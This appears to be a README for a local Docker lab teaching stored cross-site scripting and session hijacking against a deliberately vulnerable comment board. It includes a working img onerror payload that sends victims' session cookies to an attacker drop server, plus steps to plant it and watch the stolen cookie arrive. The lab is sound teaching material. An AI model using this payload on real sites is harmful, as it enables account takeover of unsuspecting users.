# Step 1: Stored XSS & Session Hijacking

This lab demonstrates a **Stored (Persistent) Cross-Site Scripting (XSS)** vulnerability and how it can be weaponized to perform **Session Hijacking**. 

In this scenario, a vulnerable comment board saves unsanitized user input to a database and renders it directly to the DOM using dangerous JavaScript methods (`innerHTML`). 

## The Attack Mechanics

Modern browsers block `<script>` tags that are dynamically injected via `innerHTML`. To bypass this, attackers use HTML event handlers. 

**The Payload:**
```html
<img src="x" onerror="fetch('http://localhost:4000/steal?data=' + document.cookie)">
```

When the browser attempts to render this comment, it fails to load the image source (x). This failure immediately triggers the onerror event, executing the malicious JavaScript. The script grabs the victim's session cookie and silently transmits it to an attacker-controlled drop server. Because the comment is stored in the database, this payload executes against every user who views the forum.

## How to Run the Lab
Open your terminal in this directory (02-xss-lab/step-1-stored-xss).

Build and start the Docker environment:

```Bash
docker-compose up --build -d
```
Start the Attacker Listener:
Open a terminal and tail the logs of the attacker's drop server:

```Bash
docker-compose logs -f attacker
```

## Executing the Attack
The Victim Logs In:

Open your browser and navigate to the forum: http://localhost:3000.

Click Login to get Session Cookie.

Plant the Trap:

In the "Your Name" field, enter any name.

In the "Write something..." field, paste the exact payload from above.

Click Submit.

## The Result:

In the browser, the comment appears with a broken image icon.

In your attacker terminal, you will instantly see the victim's stolen session cookie logged:
```
🚨 [ATTACKER SERVER] DATA STOLEN: session=...
```

## Clean Up
```Bash
docker-compose down -v
```